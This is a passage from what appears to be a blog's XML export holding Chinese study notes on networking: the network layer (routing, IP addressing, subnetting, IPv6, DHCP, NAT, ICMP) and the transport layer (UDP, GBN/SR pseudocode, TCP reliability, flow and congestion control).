<p><img src="https://i.loli.net/2020/02/05/cZXOdiAoawHnWI7.png" alt="接口分组"></p>
<p><img src="https://i.loli.net/2020/02/05/OJNQRrKyuDflYqm.png" alt="MAC分组"></p>
<p><strong>通过路由器在 VLAN 间转发</strong>（像独立的交换机之间）。</p>
]]></content>
      <categories>
        <category>计算机网络</category>
      </categories>
      <tags>
        <tag>链路层</tag>
      </tags>
  </entry>
  <entry>
    <title>网络那些事之网络层</title>
    <url>/2020/01/25/%E7%BD%91%E7%BB%9C%E9%82%A3%E4%BA%9B%E4%BA%8B%E4%B9%8B%E7%BD%91%E7%BB%9C%E5%B1%82/</url>
    <content><![CDATA[<p>网络层的核心功能有两个：</p>
<ul>
<li>路由：确定分组从源到目的经过的路径。由<strong>路由算法</strong>确定转发表</li>
<li>转发：数据报由路由器的输入端口转移到合适的输出端口。每个路由器维护一个<strong>转发表</strong></li>
</ul>
<h2 id="服务模型"><a href="#服务模型" class="headerlink" title="服务模型"></a>服务模型</h2><p>在发送方主机与接收方主机之间传输数据报。属于<code>尽力而为</code>服务。</p>
<ul>
<li>无连接服务：不事先为系列分组的传输确定路径，每个分组独立确定路径。由路由器根据当前网络状态选择路径（数据报网络）</li>
<li>连接服务：首先为系列分组的传输确定路径，建立网络层逻辑连接（虚电路网络）</li>
</ul>
<p><img src="https://i.loli.net/2020/01/28/UXhmizIdVLYHj94.png" alt="网络层服务"></p>
<h3 id="虚电路网络"><a href="#虚电路网络" class="headerlink" title="虚电路网络"></a>虚电路网络</h3><p>虚电路：一条从源主机到目的主机，类似于实体电路的虚拟连接路径。与实际电路最大的区别在于<strong>分组交换</strong>。</p>
<p>路径上每一个网络设备都要维护虚电路连接状态。</p>
<h4 id="通信过程"><a href="#通信过程" class="headerlink" title="通信过程"></a>通信过程</h4><ol>
<li>呼叫建立</li>
<li>数据传输</li>
<li>拆除呼叫</li>
</ol>
<h4 id="具体实现"><a href="#具体实现" class="headerlink" title="具体实现"></a>具体实现</h4><p>每条虚电路包括：</p>
<ul>
<li>源主机到目的主机的<strong>一条路径</strong></li>
<li><strong>虚电路号（VCID）</strong>，沿路每段链路一个编号</li>
<li>网络层设备（如路由器）<strong>用转发表记录经过的每条虚电路</strong></li>
</ul>
<p>沿某条虚电路传输的分组，携带对应虚电路的 VCID 而不是目的地址。</p>
<p><img src="https://i.loli.net/2020/01/25/79sQjzEGxgWF3oy.png" alt="虚电路号"></p>
<h3 id="数据报网络"><a href="#数据报网络" class="headerlink" title="数据报网络"></a>数据报网络</h3><p>特点：</p>
<ul>
<li>网络层无连接</li>
<li>每个分组携带目的地址</li>
<li>路由器根据分组目的地址转发分组（构建转发表、检索转发表、独立选路）</li>
</ul>
<p><img src="https://i.loli.net/2020/01/25/kMumZIhvYcxjQod.png" alt="数据报网络"></p>
<p>路由器按照<strong>最长匹配前缀原则</strong>选择转发接口。</p>
<p>Internet 就属于数据报网络。</p>
<p>下面是一个现实中的路由表示例（本地网卡 IP 地址 192.168.100.107，子网掩码 255.255.255.0，默认网关 192.168.100.11）：</p>
<p><img src="https://i.loli.net/2020/05/17/EYpG8NLcA1yjivJ.png" alt="路由表"></p>
<p>接口列表指明了该机有哪些接口。网络目标 &amp; 网络掩码 == 子网，根据子网将数据报从不同接口发送出去。</p>
<ul>
<li>网络目标：用来标识数据包的目的网络</li>
<li>网络掩码：与网络目标一起标识目的主机或者路由器的子网地址</li>
<li>接口：数据包从哪个接口发出去</li>
<li>网关：数据包下一跳的 IP 地址</li>
<li>跃点：优先级，跃点越少优先级越高。</li>
</ul>
<table>
<thead>
<tr>
<th>网络目标</th>
<th>网络掩码</th>
<th>网关</th>
<th>接口</th>
<th>解释</th>
</tr>
</thead>
<tbody><tr>
<td>0.0.0.0</td>
<td>0.0.0.0</td>
<td>192.168.100.11</td>
<td>192.168.100.107</td>
<td>收到一个目的地址不在路由表中的数据包，将该数据包通过 192.168.100.107 发送到默认网关 192.168.100.11</td>
</tr>
<tr>
<td>127.0.0.0</td>
<td>255.0.0.0</td>
<td>在链路上</td>
<td>127.0.0.1</td>
<td>收到一个发往目标网段 127.0.0.0/8 的数据包时，发送给该网段的所有数据包</td>
</tr>
<tr>
<td>127.0.0.1</td>
<td>255.255.255.255</td>
<td>在链路上</td>
<td>127.0.0.1</td>
<td>收到一个目的 IP 为默认本机 IP 的数据包时，系统会将该数据包收下</td>
</tr>
<tr>
<td>192.168.100.0</td>
<td>255.255.255.0</td>
<td>在链路上</td>
<td>192.168.100.107</td>
<td>收到一个发往目的网段 192.168.100.0/24 的数据包时，将该数据包通过 192.168.100.107 这个接口发送出去</td>
</tr>
<tr>
<td>192.168.100.107</td>
<td>255.255.255.255</td>
<td>在链路上</td>
<td>192.168.100.107</td>
<td>收到一个目的 IP 为本地网卡 IP 的数据包时，系统会将该数据包收下</td>
</tr>
<tr>
<td>192.168.100.255</td>
<td>255.255.255.255</td>
<td>在链路上</td>
<td>192.168.100.107</td>
<td>收到一个发给直连网段的本地广播数据包时，系统会将该数据包从 192.168.100.107 这个接口以广播的形式发送出去</td>
</tr>
</tbody></table>
<h2 id="IP-协议"><a href="#IP-协议" class="headerlink" title="IP 协议"></a>IP 协议</h2><p><img src="https://i.loli.net/2020/01/28/YEol4CqfpZMPDck.png" alt="IP数据报"></p>
<ul>
<li>版本号：4bits。</li>
<li>首部长度：4bits。首部字节数 = 4 * 首部长度</li>
<li>服务类型：8bits。区别不同类型 IP 数据报，只有在网络提供区分服务才有用</li>
<li>总长度：16bits。IP 分组的总字节数（20 B - 65535 B）</li>
<li>生存时间（TTL）：8bits。IP 分组在网络中可以通过的路由器数。路由器每转发一次这个值 -1</li>
<li>协议：8bits。指示 IP 分组封装的是哪个传输层协议（TCP/UDP）的数据报</li>
<li>首部校验和：16bits。对 IP 分组<strong>首部</strong>的差错检测，每次路由器转发都要重新计算</li>
<li>源 IP、目的 IP：32bits。</li>
<li>选项字段：1-40 bytes。IPv4 中<strong>通常不存在</strong>这个字段。</li>
<li>填充：0-3 bytes。补齐长度，保证首部长度是 4bytes 的倍数。</li>
</ul>
<p>IPv4 数据报首部长度通常为 20 bytes（5 行，每行 4bytes），第一个字节典型值为 45（版本号 4，首部长度 5）。</p>
<h3 id="IP-分片"><a href="#IP-分片" class="headerlink" title="IP 分片"></a>IP 分片</h3><p>最大传输单元（MTU）：<strong>链路层</strong>数据帧可封装的字节数的上限。不同链路的 MTU 可能不同。</p>
<p>为了解决不同链路之间 MTU 不同问题，IP 分组需要进行<strong>分片</strong>。IP 分片到达<strong>目的主机</strong>后进行<strong>重组</strong>。如果传输过程中个别分组丢失导致重组失败，目的主机直接<strong>丢弃</strong>已接收分组。</p>
<p>IP 首部相关字段参与标识分片与确定分片顺序：总长度、标识、标志位、片偏移。</p>
<ul>
<li>标识：16bits。标识一个 IP 分组。IP 协议利用一个计数器，每产生一个 IP 分组计数器 +1，作为该分组的表示。</li>
<li>标志位：3bits。保留 + DF(Don’t Fragment) + MF(More Fragment)<br><img src="https://i.loli.net/2020/01/28/JDLmZTzw6kbp3tq.png" alt="标志位格式"></li>
<li>片偏移：13bits。一个分片封装源 IP 分组数据的相对偏移量。偏移字节数 = 8 * 片偏移</li>
</ul>
<p>假设 IP 分组总长度 L，链路 MTU 为 M。若 L &gt; M 且 DF = 0，则需要分片。分片时每个分片的标识复制原 IP 分组的标识。除最后一个分片，其余分片均为 MTU 允许的最大分片且数据大小为 8 的倍数。</p>
<h3 id="IP-编址"><a href="#IP-编址" class="headerlink" title="IP 编址"></a>IP 编址</h3><h4 id="IPv4"><a href="#IPv4" class="headerlink" title="IPv4"></a>IPv4</h4><p>一共 32 bits，标识主机、路由器的<strong>接口</strong>。</p>
<h5 id="子网"><a href="#子网" class="headerlink" title="子网"></a>子网</h5><p>IP 地址 = 网络号（高比特位） + 主机号（低比特位）。相同网络号组成的网络称为<strong>IP 子网</strong>。转发表只记录<strong>子网地址</strong>。</p>
<p>IP 子网中的设备可以不跨越路由器彼此物理联通。</p>
<p><img src="https://i.loli.net/2020/01/29/wbMGcL2HjV3qKTO.png" alt="IP 子网"></p>
<h5 id="有类-IP-地址"><a href="#有类-IP-地址" class="headerlink" title="有类 IP 地址"></a>有类 IP 地址</h5><p><img src="https://i.loli.net/2020/01/29/hGEr5QJgxKwjLTb.png" alt="有类编址"></p>
<p>A 类网络数少，每个网络内主机数多；C 类网络数多，每个网络内主机数少。</p>
<p>D 类、E 类不划分网络号和主机号，D 类用于多播，E 类暂不使用。</p>
<h5 id="私有地址"><a href="#私有地址" class="headerlink" title="私有地址"></a>私有地址</h5><p>私有地址只用于子网内部，在公共 Internet 上无效。</p>
<p><img src="https://i.loli.net/2020/01/29/o5EFlHrysNKYw4X.png" alt="私有地址"></p>
<h5 id="特殊-IP-地址"><a href="#特殊-IP-地址" class="headerlink" title="特殊 IP 地址"></a>特殊 IP 地址</h5><p><img src="https://i.loli.net/2020/01/29/PktSwAIXfhDiHGd.png" alt="特殊 IP"></p>
<h5 id="子网划分"><a href="#子网划分" class="headerlink" title="子网划分"></a>子网划分</h5><p>IP 地址 = 网络号（高比特位） + 子网号（部分原主机号高比特位） + 主机号（低比特位）</p>
<h5 id="子网掩码"><a href="#子网掩码" class="headerlink" title="子网掩码"></a>子网掩码</h5><p>用途：表明一个 IP 地址所处子网的子网号。</p>
<p>取值： 32 bits。IP 地址的网络号、子网号全取 1，主机号全取 0。</p>
<p>例：A 网默认子网掩码 255.0.0.0；B 类默认子网掩码 255.255.0.0；C 类默认子网掩码 255.255.255.0；3 位子网号的 B 类子网掩码 255.255.224.0。</p>
<p><strong>“子网地址 + 子网掩码”确定子网大小！</strong></p>
<p>将 IP 分组目的 IP 地址与子网掩码<strong>按位与</strong>运算，得到<strong>子网地址</strong>。</p>
<h4 id="CIDR-Classless-InterDomain-Routing"><a href="#CIDR-Classless-InterDomain-Routing" class="headerlink" title="CIDR(Classless InterDomain Routing)"></a>CIDR(Classless InterDomain Routing)</h4><p>消除传统 A、B、C 类地址界限。网络号与主机号组成网络前缀，前缀可以任意长度。</p>
<p>融合子网地址与子网掩码，方便子网划分。无类地址格式：a.b.c.d/x，x 为前缀长度。</p>
<h4 id="IPv6"><a href="#IPv6" class="headerlink" title="IPv6"></a>IPv6</h4><p>IPv6 数据报格式：</p>
<ul>
<li>固定长度为 40bytes 的<strong>基本首部</strong></li>
<li>不允许分片</li>
</ul>
<p><img src="https://i.loli.net/2020/01/30/b1QmZhWnNd94vFs.png" alt="IPv6格式"></p>
<ul>
<li>流标签：24bits。表示同一“流”中的数据报。流：源主机到目的主机的所有 IPv6 数据报</li>
<li>载荷长度：16 bits。</li>
<li>下一首部：8bits。指向第一个扩展首部，如果扩展首部不存在则指向传输层报文首部</li>
<li>跳步限制：8bits。报文生存时间</li>
</ul>
<h5 id="IPv6-地址形式"><a href="#IPv6-地址形式" class="headerlink" title="IPv6 地址形式"></a>IPv6 地址形式</h5><p>一共 128 bits。划分为 8 组，每组 12 bits，以 16 进制表示。如：<code>1080:0:0:0:8:800:200C:417A</code>，当中间出现多个连续的 0，可以使用压缩形式：<code>1080::8:800:200C:417A</code>。</p>
<p><strong>IPv6 不再使用掩码！</strong>，统一以 CIDR 形式表示网络大小。</p>
<h5 id="相比-IPv4-的改变"><a href="#相比-IPv4-的改变" class="headerlink" title="相比 IPv4 的改变"></a>相比 IPv4 的改变</h5><ul>
<li><strong>检验和</strong>：彻底移除，每跳处理时间大大减少。</li>
<li><strong>选项</strong>：从基本首部移出变为可选，路由器转发时间减少。</li>
</ul>
<h2 id="DHCP-协议"><a href="#DHCP-协议" class="headerlink" title="DHCP 协议"></a>DHCP 协议</h2><p>主机从 DHCP 服务器动态获取 IP 地址、子网掩码、默认网关、DNS 服务器名称与地址等信息。</p>
<p><img src="https://i.loli.net/2020/01/29/Y1FasAxPQzDW8Id.png" alt="DHCP"></p>
<p>DHCP 协议在<strong>应用层</strong>实现：</p>
<ul>
<li>请求报文封装到 <strong>UDP</strong> 数据报中</li>
<li>IP 广播</li>
<li>链路层广播</li>
</ul>
<h4 id="网络地址转换（NAT）"><a href="#网络地址转换（NAT）" class="headerlink" title="网络地址转换（NAT）"></a>网络地址转换（NAT）</h4><p>多个私有 IP 地址组成的内网通过 NAT 转换成统一的公有 IP 地址与外网通信。</p>
<p>优势：</p>
<ul>
<li>只向 ISP 申请一个 IP 地址</li>
<li>本地设备变更 IP 地址对外网是透明的</li>
<li>变更 ISP 时，无需修改内网设备的 IP 地址</li>
<li>内网设备对外网不可见（安全）</li>
</ul>
<p>实现：</p>
<ul>
<li>替换：利用（NAT IP 地址，新端口号）替换每个<strong>外出 IP 数据报</strong>的（源 IP 地址，源端口号）</li>
<li>记录：将每对（NAT IP 地址，新端口号）与（源 IP 地址，源端口号）的替换信息存储到 <strong>NAT 转换表</strong> 中</li>
<li>替换：根据 NAT 转换表，利用（源 IP 地址，源端口号）替换每个<strong>进入内网 IP 数据报</strong>的（目的 IP 地址，目的端口号），即（NAT IP 地址，新端口号）</li>
</ul>
<p><img src="https://i.loli.net/2020/01/29/ZU9wXMSGixCm1Kf.png" alt="NAT过程"></p>
<p><strong>客户端发送给服务器的 IP 报文，源 IP 不变，目的 IP 随跳跃改变，服务器发送给客户端的 IP 报文，源 IP 随跳跃改变，目的 IP 不变</strong>。</p>
<p>NAT 穿透：</p>
<ul>
<li>端口转发：配置路由器，将外部客户对特定端口的请求转发给特定内部服务器</li>
<li>中继：内、外部客户分别与中继服务器建立连接。中继服务器桥接两个连接的分组（skype、frp 等应用都基于此）<br><img src="https://i.loli.net/2020/01/30/7BtAgQ8hsUYOklC.png" alt="中继"></li>
</ul>
<h2 id="ICMP-协议"><a href="#ICMP-协议" class="headerlink" title="ICMP 协议"></a>ICMP 协议</h2><p>当 IP 数据报传输出错<strong>被丢弃</strong>时，路由器向源主机发送 ICMP 报文。</p>
<p>功能：</p>
<ul>
<li>异常报告</li>
<li>网络探询</li>
</ul>
<p>两类 ICMP 报文：</p>
<ul>
<li>差错报告报文（5 种）：<ul>
<li>目的不可达</li>
<li>源抑制：路由器发现网络拥塞，提示要降低发送速率</li>
<li>超时：TTL 超时</li>
<li>参数错误：路由器发现分组某些字段有问题</li>
<li>重定向：路由器发现这个分组不应该由它转发</li>
</ul>
</li>
<li>网络探询报文（2 种）：<ul>
<li>回声请求与应答报文。ping 基于此</li>
<li>时间戳请求与应答报文：请求获得时间戳</li>
</ul>
</li>
</ul>
<p>ICMP 报文封装到 IP 数据报中传输：<br><img src="https://i.loli.net/2020/01/30/32BVGCpILAkHbdU.png" alt="ICMP格式"></p>
<p>ICMP 报文封装了被丢弃的差错 IP 数据报的首部和前 8bytes 数据（这 8 bytes 通常为 UDP 首部或 TCP 部分首部）：<br><img src="https://i.loli.net/2020/01/30/rIVjqRGvF5Hc1N8.png" alt="ICMP数据部分"></p>
]]></content>
      <categories>
        <category>计算机网络</category>
      </categories>
      <tags>
        <tag>网络层</tag>
      </tags>
  </entry>
  <entry>
    <title>网络那些事之传输层</title>
    <url>/2020/01/22/%E7%BD%91%E7%BB%9C%E9%82%A3%E4%BA%9B%E4%BA%8B%E4%B9%8B%E4%BC%A0%E8%BE%93%E5%B1%82/</url>
    <content><![CDATA[<p>本层将会涉及传输层 TCP/UDP 协议的复用/分用、可靠数据传输、流量控制、拥塞控制。</p>
<span id="more"></span>

<h2 id="传输层"><a href="#传输层" class="headerlink" title="传输层"></a>传输层</h2><p>传输层协议为运行在不同 Host 上的<strong>进程</strong>提供了一种逻辑通信机制。所谓逻辑通信，指发送方接收方像是直接通信，下面的协议是透明的。</p>
<p>传输层与网络层不同在于传输层提供进程之间逻辑通信，网络层提供主机之间逻辑通信。</p>
<h2 id="多路复用与多路分用"><a href="#多路复用与多路分用" class="headerlink" title="多路复用与多路分用"></a>多路复用与多路分用</h2><p>某层一个协议直接对应上层多个协议/实体，则需要复用/分用。</p>
<ul>
<li>多路复用：传输层从多个 socket 接收数据，进行头部封装后交给网络层。</li>
<li>多路分用：传输层从网络层接收数据，根据头部信息分发给多个 socket。</li>
</ul>
<h2 id="TCP-UDP-的多路复用分用"><a href="#TCP-UDP-的多路复用分用" class="headerlink" title="TCP/UDP 的多路复用分用"></a>TCP/UDP 的多路复用分用</h2><p>UDP socket 通过<strong>目的端口号</strong>唯一确定，来自不同客户端有相同目的端口的 UDP 报文会被发到相同的服务器 socket 上。</p>
<p>TCP socket 通过<strong>原IP，目的IP， 原端口号，目的端口号</strong>唯一确定，来自不同客户端有相同目的端口的 TCP 报文会被发到不同的服务器 socket 上。</p>
<h2 id="UDP"><a href="#UDP" class="headerlink" title="UDP"></a>UDP</h2><ul>
<li>复用/分用</li>
<li>错误校验（无纠错）</li>
</ul>
<p>属于<code>无连接</code>协议，提供<code>尽力而为</code>的服务。报文可能丢失，可能非按序到达。</p>
<p><img src="https://i.loli.net/2020/01/23/ubYceGtf5DmOdLH.png" alt="UDP报文格式"></p>
<p>checksum：校验和。负责错误校验。</p>
<p><img src="https://i.loli.net/2020/01/23/AL6TqEfa3YwcnVh.png" alt="计算校验和"></p>
<p><img src="https://i.loli.net/2020/01/23/3qEVYFGcfWjK1I5.png" alt="计算示例"></p>
<h3 id="为什么在传输层做链路检测"><a href="#为什么在传输层做链路检测" class="headerlink" title="为什么在传输层做链路检测"></a>为什么在传输层做链路检测</h3><p>传输层是端到端协议，不能确保这层以下的层次都有错误校验机制。因此需要在离应用层最近的这一层做错误校验。</p>
<h3 id="优势"><a href="#优势" class="headerlink" title="优势"></a>优势</h3><ul>
<li>延迟低（无连接）。</li>
<li>实现简单（不维护连接状态）。</li>
<li>头部开销少（只需 8bytes，而 TCP 头部需要 20bytes）。</li>
<li>没有拥塞控制，可以控制发送时间和速率。</li>
</ul>
<h2 id="可靠数据传输"><a href="#可靠数据传输" class="headerlink" title="可靠数据传输"></a>可靠数据传输</h2><p>可靠：<strong>不错（带纠错）</strong>，<strong>不丢</strong>，<strong>不乱</strong>。</p>
<h3 id="不错"><a href="#不错" class="headerlink" title="不错"></a>不错</h3><p>利用<strong>校验和</strong>检测位错误。如果有错误，尝试进行恢复。</p>
<h4 id="如何从错误中恢复"><a href="#如何从错误中恢复" class="headerlink" title="如何从错误中恢复"></a>如何从错误中恢复</h4><p><strong>确认（Acknowledgements，ACK）</strong>：接收方显示告知发送方分组已正确接收。</p>
<p><strong>NAK</strong>：接收方显示告知发送方分组错误。</p>
<p>发送方收到 NAK 后，<strong>重传</strong>分组。如果收到的 ACK/NAK 坏掉，<strong>重传</strong>分组。</p>
<h4 id="解决重传分组重复问题"><a href="#解决重传分组重复问题" class="headerlink" title="解决重传分组重复问题"></a>解决重传分组重复问题</h4><p><strong>序列号</strong>：发送方给每个分组增加序列号。接收方丢弃重复分组。</p>
<p>如果接收方用 ACK 告知最后一个正确接收分组的序列号，可以不使用 NAK。</p>
<h3 id="不丢"><a href="#不丢" class="headerlink" title="不丢"></a>不丢</h3><p>发送方等待“<strong>合理</strong>”时间，这个时间内没收到 ACK，<strong>重传</strong>分组。如果这个时间设置过短，依然能正常通信，但是会产生冗余包：</p>
<p><img src="https://i.loli.net/2020/01/23/RbD1VtK29OyFfQW.png" alt="等待时间过短"></p>
<h3 id="提高性能（不乱）"><a href="#提高性能（不乱）" class="headerlink" title="提高性能（不乱）"></a>提高性能（不乱）</h3><p>利用<strong>流水线机制</strong>与<strong>滑动窗口协议</strong>。为了实现流水线机制，我们需要：</p>
<ul>
<li>更大的<strong>序列号范围</strong></li>
<li>更大的存储空间以<strong>缓存分组</strong></li>
</ul>
<h4 id="滑动窗口协议"><a href="#滑动窗口协议" class="headerlink" title="滑动窗口协议"></a>滑动窗口协议</h4><p>窗口：允许使用的序列号范围 N。</p>
<p>滑动窗口：随着协议的运行，窗口在序列号空间内<strong>向前滑动</strong>。</p>
<p><img src="https://i.loli.net/2020/01/23/GAiYTnW2vMxeUoX.png" alt="滑动窗口"></p>
<h5 id="GBN（后退N帧）-协议"><a href="#GBN（后退N帧）-协议" class="headerlink" title="GBN（后退N帧） 协议"></a>GBN（后退N帧） 协议</h5><p>采用<strong>累积确认机制</strong>，ACK(n)：确认到序列号 n（包含n）的分组已被正确接受。为分组设置<strong>定时器</strong>。</p>
<p>超时事件Timeout(n)：重传序列号大于等于 n 的所有未确认分组。</p>
<p>发送方维护两个变量：base and nextseqnum：</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="keyword">if</span> (nextseqnum &lt; base + N) &#123;    <span class="comment">// 如果有窗口内有可用序列号</span></span><br><span class="line">    udt_send(packet[nextseqnum])    <span class="comment">// 发送编号为 nextseqnum 的数据</span></span><br><span class="line">    <span class="keyword">if</span> (base == nextseqnum)</span><br><span class="line">        start_timer;    <span class="comment">// 开始定时器</span></span><br><span class="line">    nextseqnum++;</span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">    refuse_data(data);  <span class="comment">// 拒绝发送</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">if</span> timeout <span class="keyword">or</span> <span class="title">corrupt</span><span class="params">(rcvpkt)</span> </span>&#123; <span class="comment">// 如果超时或收到损坏的 ACK</span></span><br><span class="line">        start_timer;    <span class="comment">// 重置定时器</span></span><br><span class="line">        udt_send(data[base])</span><br><span class="line">        ...</span><br><span class="line">        udt_send(data[nextseqnum<span class="number">-1</span>])    <span class="comment">// 重传所有未确认分组</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">if</span> <span class="title">notcorrupt</span><span class="params">(rcvpkt)</span> </span>&#123; <span class="comment">// 如果正常收到 ACK</span></span><br><span class="line">    base = getacknum(rcvpkt) + <span class="number">1</span>;   <span class="comment">// 更新 base，窗口向前滑动！</span></span><br><span class="line">    <span class="keyword">if</span> (base == nextseqnum) <span class="comment">// 所有已发送分组均被正确接收</span></span><br><span class="line">        stop_timer;</span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">        start_timer;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>接收方值只记住一个变量 expectedseqnum：</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="keyword">if</span> !corrupt(rcvpkt) <span class="function"><span class="keyword">and</span> <span class="title">hasseqnum</span><span class="params">(rcvpkt, expectedseqnum)</span> </span>&#123; <span class="comment">// 如果正确接收分组</span></span><br><span class="line">    data = extract(rcvpkt);</span><br><span class="line">    deliver(data);  <span class="comment">// 向应用层传递数据</span></span><br><span class="line">    udt_send(expectednum, ACK, checksum);   <span class="comment">// 发送 ACK(expectedseqnum)</span></span><br><span class="line">    expectednum++;  <span class="comment">// 更新 expectedseqnum</span></span><br><span class="line">&#125; <span class="keyword">else</span> &#123;    <span class="comment">// 分组损坏 or 乱序到达：直接丢弃</span></span><br><span class="line">    udt_send(expectednum, ACK, checksum);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p><img src="https://i.loli.net/2020/01/23/tzYge7b6PmEK2CD.png" alt="GBN示例"></p>
<h5 id="SR（选择重传）协议"><a href="#SR（选择重传）协议" class="headerlink" title="SR（选择重传）协议"></a>SR（选择重传）协议</h5><p>接收方对每个分组<strong>单独确认</strong>，设置<strong>缓存机制</strong>，缓存乱序到达分组。发送方只重传没收到 ACK 的分组，为每个分组都设置定时器。</p>
<p>在接收方，我们也设置一个窗口：<br><img src="https://i.loli.net/2020/01/23/tROCeGoPl3svUqp.png" alt="SR发送接收窗口"></p>
<p><img src="https://i.loli.net/2020/01/23/thXiMKGmVSgLpqN.png" alt="SR发送接收分工"></p>
<h2 id="TCP"><a href="#TCP" class="headerlink" title="TCP"></a>TCP</h2><p>TCP 的可靠数据传输，<strong>既不是 GBN，也不是 SR</strong>！</p>
<ul>
<li>复用/分用</li>
<li>点对点传输</li>
<li>流水线机制</li>
<li>发送方/接收方缓存（SR）</li>
<li>双全工</li>
<li>面向连接</li>
<li>流量控制</li>
</ul>
<p><img src="https://i.loli.net/2020/01/24/wyvrUqoTia52AuN.png" alt="TCP格式"></p>
<p>序列号指 segment 中第一个字节的编号而不是 segment 的编号，建立 TCP 连接时，双方随机选择序列号。</p>
<p>ACKs 指希望收到的下一字节序列号，使用<strong>累计确认</strong>机制（GBN）。</p>
<h3 id="触发重传的事件"><a href="#触发重传的事件" class="headerlink" title="触发重传的事件"></a>触发重传的事件</h3><ul>
<li>超时</li>
<li>收到重复 ACK</li>
</ul>
<p>TCP 只使用<strong>一个计时器</strong>。</p>
<h3 id="设置定时器超时时间"><a href="#设置定时器超时时间" class="headerlink" title="设置定时器超时时间"></a>设置定时器超时时间</h3><p>SampleRTT：从段发出到收到 ACK 用时。</p>
<p>EstimatedRTT：多个 SampleRTT 加权平均值。</p>
<p>超时时间间隔（TimeoutInterval） = EstimatedRTT + 安全边界（DevRTT）</p>
<p><img src="https://i.loli.net/2020/01/24/dYT7Aiw95bBxcKN.png" alt="EstimatedRTT求值"></p>
<p><img src="https://i.loli.net/2020/01/24/HZdy1zDrj56MXFc.png" alt="DevRTT求值"></p>
<p><img src="https://i.loli.net/2020/01/24/EJGCumZoVlyWIpe.png" alt="超时时间间隔求值"></p>
<h3 id="快速重传"><a href="#快速重传" class="headerlink" title="快速重传"></a>快速重传</h3><p>通过检测多个重复的 ACK，发送方确认某个分组已经丢失。快速重传可以在定时器超时之前即进行重传。</p>
<p>如果发送方收到对某一数据的 3 个 ACK，则启动快速重传机制。</p>
<h3 id="流量控制"><a href="#流量控制" class="headerlink" title="流量控制"></a>流量控制</h3><p>本质上，流量控制是一种<strong>速度匹配</strong>机制。</p>
<p>接收方为 TCP 连接分配 Buffer：</p>
<p><img src="https://i.loli.net/2020/01/24/sA8wQaBl3V9PjZI.png" alt="接收方Buffer"></p>
<p>接收方通过在 Segment 头部字段将 RcvWindow 告诉发送方。发送方已发送但未接收 ACK 的数据量不超过 RcvWindow。</p>
<p>RcvWindow = 0，发送方仍然可以发送一个很小的段来更新 RcvWindow 值。</p>
<h3 id="TCP-连接管理"><a href="#TCP-连接管理" class="headerlink" title="TCP 连接管理"></a>TCP 连接管理</h3><p>三次握手：</p>
<ol>
<li>客户端发送 SYN 报文。</li>
<li>服务器发送 SYN/ACK 报文</li>
<li>客户端发送 ACK 报文，此时可以包含数据。</li>
</ol>
<p><img src="https://i.loli.net/2020/01/24/jKaRhulIT8k9D5A.png" alt="三次握手"></p>
<p>四次挥手：</p>
<ol>
<li>客户端发送 FIN 报文</li>
<li>服务器发送 ACK。发送 FIN</li>
<li>客户端收到 FIN，回复 ACK，进入等待状态（确保服务器正确关闭资源）</li>
<li>服务器收到 ACK，连接关闭</li>
</ol>
<p><img src="https://i.loli.net/2020/01/24/PV2D49ulaBKycgo.png" alt="四次挥手"></p>
<h3 id="拥塞控制"><a href="#拥塞控制" class="headerlink" title="拥塞控制"></a>拥塞控制</h3><p>与流量控制考虑端到端时延不同，拥塞控制是出于避免发出过多报文导致网络拥塞的考虑。如果说流量控制是小乘佛法，那么拥塞控制就是大乘佛法。</p>
<p>网络层不显式提供拥塞控制支持，端系统通过观察丢失、时延等网络行为判断是否发生拥塞。</p>
<h4 id="基本原理"><a href="#基本原理" class="headerlink" title="基本原理"></a>基本原理</h4><p>发送方设置一个变量 CongWin，动态调整变量以改变发送速率。保证：</p>
<p>LastByteSend - LastByteAcked &lt;= CongWin</p>
<p>rate = CongWin/RTT</p>
<h4 id="如何感知网络拥塞"><a href="#如何感知网络拥塞" class="headerlink" title="如何感知网络拥塞"></a>如何感知网络拥塞</h4><p>发生 Loss 事件（超时或收到 3 个重复 ACK）后，发送方调整速率。</p>
<h4 id="如何调整速率"><a href="#如何调整速率" class="headerlink" title="如何调整速率"></a>如何调整速率</h4><h5 id="加性增-乘性减（拥塞避免）"><a href="#加性增-乘性减（拥塞避免）" class="headerlink" title="加性增-乘性减（拥塞避免）"></a>加性增-乘性减（拥塞避免）</h5><p>逐渐增加发送速率，直到发生 Loss。</p>
<p>方法：AIMD（Additive Increase，Mutiplicative Decrease）：</p>
<ul>
<li>Additive Increase：每个 RTT 将 CongWin 增大一个 MSS（Max Segment Size）</li>
<li>Mutiplicative Decrease：发生 Loss 后将 CongWin 减半</li>
</ul>
<p><img src="https://i.loli.net/2020/01/25/AIB1lpe8UntPEu2.png" alt="AIMD"></p>
<h5 id="慢启动"><a href="#慢启动" class="headerlink" title="慢启动"></a>慢启动</h5><p>TCP 连接建立时，CongWin = 1。此阶段可用带宽远高于初始速率。</p>
<p>原理：每收到一个 ACK，执行 CongWin++（指数增长，<strong>每次翻倍</strong>）。记录一个变量 Threshold = CongWinSize(Loss)。CongWinSize 超过 Threshold 后由指数增长变为线性增长。</p>
<p><img src="https://i.loli.net/2020/01/25/Sw6VbWrPgDziBFX.png" alt="慢启动"></p>
<p>Loss 处理：</p>
<ul>
<li>3 个重复 ACK：CongWinSize /= 2，然后线性增长</li>
<li>Timeout：CongWinSize = 1，然后指数增长（达到 Threshold 后再线性增长）</li>
</ul>
<p><strong>Timeout 比重复 ACK 更严重！</strong></p>
<ol>
<li>CongWinSize &lt; Threshold，CongWinSize 指数增长</li>
<li>CongWinSize &gt; Threshold，CongWinSize 线性增长</li>
<li>收到 3 个重复 ACK，Threshold = CongWinSize / 2，CongWinSize /= 2（Threshold == CongWinSize）</li>
<li>发生 Timeout，Threshold = CongWinSize / 2，CongWinSize = 1</li>
</ol>
]]></content>
      <categories>
        <category>计算机网络</category>
      </categories>
      <tags>
        <tag>传输层</tag>
      </tags>
  </entry>
  <entry>
    <title>递归、迭代与回溯</title>
